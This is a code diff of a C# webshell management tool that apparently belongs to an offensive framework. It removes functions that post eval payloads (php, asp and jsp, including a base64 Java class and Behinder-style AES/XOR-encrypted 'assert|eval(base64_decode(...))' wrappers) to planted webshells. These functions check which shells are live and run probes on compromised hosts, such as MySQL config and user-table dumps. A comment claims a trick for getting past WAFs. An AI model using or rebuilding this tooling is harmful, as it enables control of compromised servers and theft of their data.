@@ -2,13 +2,11 @@
 using C2.Core;
 using C2.Utils;
 using System;
-using System.Collections;
 using System.Collections.Generic;
 using System.Drawing;
 using System.IO;
 using System.Runtime.Serialization.Formatters.Binary;
 using System.Text;
-using System.Text.RegularExpressions;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -19,35 +17,10 @@ namespace C2.Business.CastleBravo.WebShellTool
 
     public partial class WebShellManageForm : Form
     {
-
-        class CheckAliveResult
-        {
-            public bool done = false;
-            public bool alive = false;
-            public bool safeM = false;
-            public CheckAliveResult(bool s = false)
-            {
-                safeM = s;
-            }
-
-        }
-
-        enum ResetTypeEnum
-        {
-            重新开始,
-            重新开始_境外站,
-            继续上次,
-            继续上次_境外,
-            选中项验活,
-            二刷不活
-        }
-
         public static ProxySetting Proxy { get; set; } = ProxySetting.Empty;
         private int NumberOfAlive { get; set; }
         private int NumberOfHost { get => setOfHost.Count; }
         private int NumberOfIPAddress { get => setOfIPAddress.Count; }
-
-        private int NumberOfThread { get => this.threadNumberButton.SelectedIndex; }
 
         private HashSet<string> setOfIPAddress;
         private HashSet<string> setOfHost;
@@ -61,15 +34,6 @@ namespace C2.Business.CastleBravo.WebShellTool
         //
 
         private FindSet finder;
-
-        // 并发验活缓存项
-        // 加速原理: 开始前先根据验活场景构造待验活项缓存
-        //           主线程从前往后逐项验活
-        //           其他线程对缓存中记录从后往前N线程并发验活,并把结果记录入缓存
-        //           主线程每次验活前,先查看是否在缓存中此项是否已经被验过了
-        //           
-        // 因为并发验活涉及到层层反馈结果到界面更新,这样设计,改动最小
-        private Dictionary<object, CheckAliveResult> cache;
 
         public WebShellManageForm()
         {
@@ -85,68 +49,6 @@ namespace C2.Business.CastleBravo.WebShellTool
             ProxyEnableSLabel.Text = "代理" + (Proxy.Enable ? "启用" : "关闭");
         }
 
-        // 根据不同的场景设置加速缓存里的内容
-        private void ResetCheckCache(ResetTypeEnum type)
-        {
-            cache.Clear();
-            // 跳过初始几项
-            for (int i = 0; i < LV.Items.Count; i++)
-            {
-                ListViewItem lvi = LV.Items[i];
-                switch (type)
-                {
-                    case ResetTypeEnum.重新开始:
-                        cache.Add(lvi.Tag, new CheckAliveResult());
-                        break;
-                    case ResetTypeEnum.重新开始_境外站:
-                        cache.Add(lvi.Tag, new CheckAliveResult(true));
-                        break;
-                    case ResetTypeEnum.继续上次:
-                        if (lvi.SubItems[5].Text.Trim().IsNullOrEmpty())
-                            cache.Add(lvi.Tag, new CheckAliveResult());
-                        break;
-                    case ResetTypeEnum.继续上次_境外:
-                        if (lvi.SubItems[5].Text.Trim().IsNullOrEmpty())
-                            cache.Add(lvi.Tag, new CheckAliveResult(true));
-                        break;
-                    case ResetTypeEnum.选中项验活:
-                        if (lvi.Selected)
-                            cache.Add(lvi.Tag, new CheckAliveResult());
-                        break;
-                    case ResetTypeEnum.二刷不活:
-                        if (lvi.SubItems[5].Text.Trim().In(new string[] { "×", "待" }))
-                            cache.Add(lvi.Tag, new CheckAliveResult());
-                        break;
-                }
-            }
-        }
-
-        private void CheckAliveSpeedUpBackground()
-        {
-            // 创建copy
-            int numberOfThread = NumberOfThread;
-            for (int nt = 0; nt < numberOfThread; nt++)
-            {
-                int threadID = nt;  // 复刻
-                Task.Run(() =>
-                {
-                    //Console.WriteLine(string.Format("启动验活后台线程 : {0}", threadID));
-                    int id = 0;
-                    foreach (var kv in cache)
-                    {
-                        if (actionNeedStop.IsCancellationRequested)
-                            break;
-                        // 分发任务
-                        if (id++ % numberOfThread == threadID)
-                        {
-                            //Console.WriteLine(string.Format("验活后台线程 {0} : 验活任务ID - {1}" , threadID, id - 1));
-                            kv.Value.alive = CheckAliveOneTaskAsyn(kv.Key as WebShellTaskConfig, kv.Value.safeM) == "√";
-                            kv.Value.done = true;
-                        }
-                    }
-                }, actionNeedStop.Token);
-            }
-        }
         private void InitializeOther()
         {
             setOfHost = new HashSet<string>();
@@ -449,10 +351,7 @@ namespace C2.Business.CastleBravo.WebShellTool
             SaveDB();
         }
 
-        private void CheckAliveAll(bool skipAlive, bool safeMode)
-        {
-            DoCheckAliveItems(LV.Items, skipAlive, safeMode);
-        }
+
 
         private void CheckAliveAllMenuItem_Click(object sender, EventArgs e)
         {
@@ -494,64 +393,6 @@ namespace C2.Business.CastleBravo.WebShellTool
 
             CheckAliveAll(false, safeMode);
             EndCheckAlive();
-        }
-
-        private void DoCheckAliveContinue(bool safeMode)
-        {
-            ResetProgressMenuValue(CountStatusBlankItem());
-
-            if (CountStatusBlankItem() == 0)
-                progressMenu.Text = "完成";
-
-            CheckAliveContinue(safeMode); 
-            EndCheckAlive();
-        }
-
-
-
-        private void DoCheckAliveItems(IList items, bool skipAlive, bool safeMode)
-        {
-            s = DateTime.Now;
-            using (new ControlEnableGuarder(this.contextMenuStrip))
-            using (new ToolStripItemEnableGuarder(this.enableItems))
-            using (new ToolStripItemTextGuarder(this.actionStatusLabel, "进行中", "已完成"))
-                foreach (ListViewItem lvi in items)
-                {
-                    if (actionNeedStop.IsCancellationRequested)
-                        break;
-                    // 启用二刷
-                    if (skipAlive && lvi.SubItems[5].Text != "待")
-                        continue;
-                    UpdateAliveItems(lvi, safeMode);
-                    UpdateProgress();
-                    CheckSavePoint(); // 5分钟保存一次
-                }
-            InitializeLock();//验活不影响功能加锁
-        }
-        private void CheckAliveContinue(bool safeMode)
-        {
-            s = DateTime.Now;
-            using (new ControlEnableGuarder(this.contextMenuStrip))
-            using (new ToolStripItemEnableGuarder(this.enableItems))
-            using (new ToolStripItemTextGuarder(this.actionStatusLabel, "进行中", "已完成"))
-                foreach (ListViewItem lvi in LV.Items)
-                {
-                    if (actionNeedStop.IsCancellationRequested)
-                        break;
-                    // 对留存的空状态验活
-                    if (!lvi.SubItems[5].Text.Trim().IsNullOrEmpty())
-                        continue;
-                    UpdateAliveItems(lvi, safeMode);
-                    UpdateProgress();
-                    CheckSavePoint(); // 5分钟保存一次
-                }
-            InitializeLock();//验活不影响功能加锁
-        }
-
-        private void EndCheckAlive()
-        {
-            RefreshTasks();
-            SaveDB();
         }
 
         private void CheckSavePoint()
@@ -630,43 +471,6 @@ namespace C2.Business.CastleBravo.WebShellTool
             lvi.SubItems[10].Text = string.Empty;
         }
 
-        private string CheckAliveOneTaskAsyn(WebShellTaskConfig task, bool safeMode)
-        {
-            if (safeMode && RefreshIPAddress(task))
-                return "跳";
-            if (PostCheckAlive(task))
-                return "√";
-
-            return "×";
-        }
-        private string CheckAliveOneTaskSync(WebShellTaskConfig task, bool safeMode)
-        {
-            string status = "×";
-            using (GuarderUtil.WaitCursor)
-            {
-                // safe模式下 跳过国内网站
-                bool isChina = RefreshIPAddress(task);
-                if (safeMode && isChina)
-                    return "跳";
-
-                // 我总结的print穿透WAF大法
-                if (CacheCheckAlive(task))
-                    return "√";
-            }
-            return status;
-        }
-
-        private bool CacheCheckAlive(WebShellTaskConfig task)
-        {
-            object key = task;
-            // 先检查是否命中缓存
-            if (cache.ContainsKey(key) && cache[key].done)
-                return cache[key].alive;
-
-            // WebClient的超时是响应超时, 但有时候网页会有响应,但加载慢, 需要整体超时控制
-            return DoEventsWait(5, Task.Run(() => PostCheckAlive(task)));
-        }
-
 
         private static bool DoEventsWait(int timeout, Task<bool> t)
         {
@@ -699,79 +503,7 @@ namespace C2.Business.CastleBravo.WebShellTool
 
             return NetUtil.IsChina(task.Country) || NetUtil.IsChina(task.Country2);
         }
-
-        private bool PostCheckAlive(WebShellTaskConfig task)
-        {
-            try
-            {
-                string url = NetUtil.FormatUrl(task.Url);
-                int seed = RandomUtil.RandomInt(31415000, 31415926);
-                string result = string.Empty;
-                List<string> payloads = GenWebshellPayload(task, seed);
-                foreach (string payload in payloads)
-                {
-                    result = WebClientEx.Post(url, payload, 15000, Proxy);
-                    if (task.TrojanType == "jspEval")
-                        return result.Contains("black cloud");
-                    if (result.Contains(seed.ToString()))
-                        return true;
-                }
-                return false;
-            }
-            catch { return false; }
-
-        }
-        private string GenPayload(string trojanType, int seed)
-        {
-            switch (trojanType)
-            {
-                // 有些网站会直接回显,这里加入运算逻辑
-                // 报文用减法运算,加号容易被url转码成空格
-                case "phpEval":
-                    return string.Format("print({0}-1);", seed + 1);
-                case "aspEval":
-                    return string.Format("response.write({0}-1)", seed + 1);
-                case "aspxEval":
-                     return string.Format("response.write({0}-1)", seed + 1);
-                case "jspEval": 
-                    return "yv66vgAAADQAQwoADgAoBwApCgACACoIACsLACwALQsALAAuCAAvCgAwADELACwAMgcAMwoACgA0CgAOADUHADYHADcBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEACUxQYXlsb2FkOwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAANvYmoBABJMamF2YS9sYW5nL09iamVjdDsBAARwY3R4AQAfTGphdmF4L3NlcnZsZXQvanNwL1BhZ2VDb250ZXh0OwEACHJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEADVN0YWNrTWFwVGFibGUHADYHADcHACkHADgHADMBAApTb3VyY2VGaWxlAQAMUGF5bG9hZC5qYXZhDAAPABABAB1qYXZheC9zZXJ2bGV0L2pzcC9QYWdlQ29udGV4dAwAOQA6AQAXdGV4dC9odG1sO2NoYXJzZXQ9VVRGLTgHADgMADsAPAwAPQA%2BAQALYmxhY2sgY2xvdWQHAD8MAEAAPAwAQQAQAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAQgAQDAAWABcBAAdQYXlsb2FkAQAQamF2YS9sYW5nL09iamVjdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQALZ2V0UmVzcG9uc2UBACEoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAA5zZXRDb250ZW50VHlwZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXdyaXRlAQALZmx1c2hCdWZmZXIBAA9wcmludFN0YWNrVHJhY2UAIQANAA4AAAAAAAIAAQAPABAAAQARAAAALwABAAEAAAAFKrcAAbEAAAACABIAAAAGAAEAAAAFABMAAAAMAAEAAAAFABQAFQAAAAEAFgAXAAEAEQAAAMwAAgAFAAAAMyvAAAJNLLYAA04tEgS5AAUCAC25AAYBABIHtgAILbkACQEApwAKOgQZBLYACyortwAMrAABAAoAIwAmAAoAAwASAAAAJgAJAAAACAAFAAkACgANABIADgAdAA8AIwASACYAEAAoABEALQATABMAAAA0AAUAKAAFABgAGQAEAAAAMwAUABUAAAAAADMAGgAbAAEABQAuABwAHQACAAoAKQAeAB8AAwAgAAAAGQAC%2FwAmAAQHACEHACIHACMHACQAAQcAJQYAAQAmAAAAAgAn";
-                default:
-                    return string.Format("print({0}-1);", seed + 1);
-
-            }
-        }
-        private List<string> GenWebshellPayload(WebShellTaskConfig task, int seed)
-        {
-            List<string> payloads = new List<string>();
-            string pass = task.Password;
-            // 默认按php算
-            string payload = GenPayload(task.TrojanType, seed);
-
-            if (task.ClientVersion == "三代冰蝎") //目前只支持冰蝎php、aes加密报文
-            {
-                string bxPayload = string.Format("assert|eval(base64_decode('{0}'));", ST.EncodeBase64(payload));
-                payloads.Add(ClientSetting.AES128Encrypt(bxPayload, pass));
-                payloads.Add(ClientSetting.XOREncrypt(bxPayload, pass));
-                if (Regex.IsMatch(pass, "[a-f0-9]{16}"))
-                {
-                    payloads.Add(ST.AES128CBCEncrypt(bxPayload, pass));
-                    payloads.Add(ClientSetting.XOREncrypt(bxPayload, pass, false));
-                }                
-                   
-            }
-            else if (task.TrojanType != "自动判断")
-            {
-                payloads.Add(pass + "=" + payload);
-            }
-            else
-            {
-                foreach (string type in Global.TrojanTypes)
-                    payloads.Add(pass + "=" + GenPayload(type, seed));
-            }
-            return payloads;
-
-        }
-       
+   
         private void ClearAllToolStripMenuItem_Click(object sender, EventArgs e)
         {
             ClearAll();
@@ -950,106 +682,7 @@ namespace C2.Business.CastleBravo.WebShellTool
                     UpdateProgress();
                 }
         }
-
-        //公共函数部分
-        private void BatchInfoColletion(bool checkAlive,int time = 60)
-        {   // 刷新前先强制清空
-            ResetProgressMenuValue(checkAlive ? CountStatusAliveItem() : LV.Items.Count);
-            ClearScanResult();
-            DoInfoCollectionTask(LV.Items, checkAlive, time);
-            EndCheckAlive();
-        }
-
-        private void SelectedInfoColletion(int time = 60)
-        {
-            ResetProgressMenuValue(LV.SelectedItems.Count);
-            ClearScanResult();
-            DoInfoCollectionTask(LV.SelectedItems, false, time);
-            EndCheckAlive();
-        }
-        private void DoInfoCollectionTask(IList items, bool checkAlive, int time)
-        {
-            s = DateTime.Now;
-            using (new ControlEnableGuarder(this.contextMenuStrip))
-            using (new ToolStripItemEnableGuarder(this.enableItems))
-            using (new ToolStripItemTextGuarder(this.actionStatusLabel, "进行中", "已完成"))
-                foreach (ListViewItem lvi in items)
-                {
-                    if (actionNeedStop.IsCancellationRequested)
-                        break;
-                    if (checkAlive && !lvi.SubItems[5].Text.Equals("√"))
-                    {
-                        lvi.SubItems[7].Text = "跳";
-                        continue;
-                    }
-                    SingleInfoCollection(lvi, time);
-                    UpdateProgress();
-                    CheckSavePoint(); // 5分钟保存一次
-                }
-        }
-        private void SingleInfoCollection(ListViewItem lvi, int time = 60)
-        {
-            WebShellTaskConfig task = lvi.Tag as WebShellTaskConfig;
-            lvi.SubItems[7].Text = "进行中";
-            using (GuarderUtil.WaitCursor)
-                DoEventsWait(time, Task.Run(() => PostInfoCollectionPayload(task)));
-            lvi.SubItems[7].Text = task.ProbeInfo;
-        }
-        private bool PostInfoCollectionPayload(WebShellTaskConfig task)
-        {
-            try
-            {
-                string payload = string.Format(ClientSetting.PayloadDict[this.sgType], task.Password);
-                if (this.sgType == SGType.UserTable)
-                {
-                    byte[] ret = WebClientEx.PostDownload(NetUtil.FormatUrl(task.Url), payload, 30000, Proxy);
-                    task.ProbeInfo = ClientSetting.ProcessingResults(ret, task.Url, ClientSetting.InfoProbeItems[this.sgType]);
-                }
-                else
-                {
-                    string ret = WebClientEx.Post(NetUtil.FormatUrl(task.Url), payload, 30000, Proxy);
-                    task.ProbeInfo = ProcessingResults(ret, task.Url);
-                }
-
-            }
-            catch (Exception ex)
-            {
-                task.ProbeInfo = ex.Message;
-            }
-            return true;
-        }
-        
-        private String ProcessingResults(string ret, string taskUrl)
-        {
-            Regex r0 = new Regex("QACKL3IO9P==(.+?)==QACKL3IO9P", RegexOptions.Singleline);
-            Regex p0 = new Regex(@"((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3}");  
-            if (this.sgType == SGType.SuperPing)  //匹配ip
-                return p0.Match(ret).Value.IsNullOrEmpty() ? "无结果" : p0.Match(ret).Value;     
-            Match m0 = r0.Match(ret);
-            if (!m0.Success)
-                return ClientSetting.InfoProbeItems[this.sgType] + ":无结果";
-
-            string rawResult = m0.Groups[1].Value;
-            if (this.sgType == SGType.LocationInfo)
-                return LocationResult(rawResult);
-
-            if (ClientSetting.table.ContainsKey(this.sgType)) //进程 计划任务 系统信息……
-                return ClientSetting.WriteResult(rawResult, taskUrl, ClientSetting.table[this.sgType]);
-         
-            return rawResult;
-        }
        
-        private string LocationResult(string rawResult)
-        {
-            Regex r = new Regex("formatted_address\":\"(.+),\"business");
-            int index = new Random().Next(0, ClientSetting.BDLocationAK.Count - 1);
-            string bdURL = string.Format(ClientSetting.BDLocationAPI, ClientSetting.BDLocationAK[index], rawResult);
-            string jsonResult = ST.EncodeUTF8(WebClientEx.Post(bdURL, string.Empty, 8000, Proxy));
-            Match m = r.Match(jsonResult);
-            return m.Success ? rawResult + ":" + m.Groups[1].Value : string.Empty;
-        }
-
-        
         // msf部分
         private void MSFMenu_Click(object sender, EventArgs e)
         {
@@ -1174,15 +807,7 @@ namespace C2.Business.CastleBravo.WebShellTool
             CreatePingPayload();
             BatchInfoColletion(true);
         }
-        private void CreatePingPayload()
-        {
-            this.sgType = SGType.SuperPing;
-            SuperPingSet sps = new SuperPingSet();
-            if (sps.ShowDialog() != DialogResult.OK)
-                return;
-            string payload = string.Format(ClientSetting.SuperPingPayload, "{0}", ST.EncodeBase64(sps.Domain));
-            ClientSetting.PayloadDict[SGType.SuperPing] = payload;
-        }
+
 
 
         private void 配置文件探针ToolStripMenuItem_Click(object sender, EventArgs e)
@@ -1194,26 +819,7 @@ namespace C2.Business.CastleBravo.WebShellTool
                 return;
             SelectedInfoColletion(timeout);
         }
-        private int ConfigPayloadOk()
-        {
-            MysqlProbeSet mps = new MysqlProbeSet();
-            if (mps.ShowDialog() != DialogResult.OK)
-                return 0;
 
-            int ps = mps.ProbeStrategy;
-            string files = mps.SearchFiles.Trim();
-            string fields = mps.SearchFields.Trim();
-
-            this.sgType = SGType.MysqlProbe;
-            string payload = string.Format(ClientSetting.MysqlProbePayload,
-                "{0}",
-                ps,
-                ST.EncodeBase64(files),
-                ST.EncodeBase64(fields));
-
-            ClientSetting.PayloadDict[SGType.MysqlProbe] = payload;
-            return mps.TimeoutSeconds;
-        }
         private void UserMYD探针ToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (this.LV.SelectedItems.Count == 0)
@@ -1222,19 +828,7 @@ namespace C2.Business.CastleBravo.WebShellTool
                 return;
             SelectedInfoColletion();
         }
-        private bool UserMYDPayloadOK()
-        {
-            bool buildOK = true;             
-            UserMYDProbeSet utp = new UserMYDProbeSet();
-            if (utp.ShowDialog() != DialogResult.OK)
-                return !buildOK;
-            this.sgType = SGType.UserTable;
-            string payload = string.Format(ClientSetting.UserTablePayload,
-                                         "{0}", utp.DBUser, utp.DBPassword);
 
-            ClientSetting.PayloadDict[SGType.UserTable] = payload;
-            return buildOK;
-        }
 
         private void 全部验活_继续上次ToolStripMenuItem_Click(object sender, EventArgs e)
         {
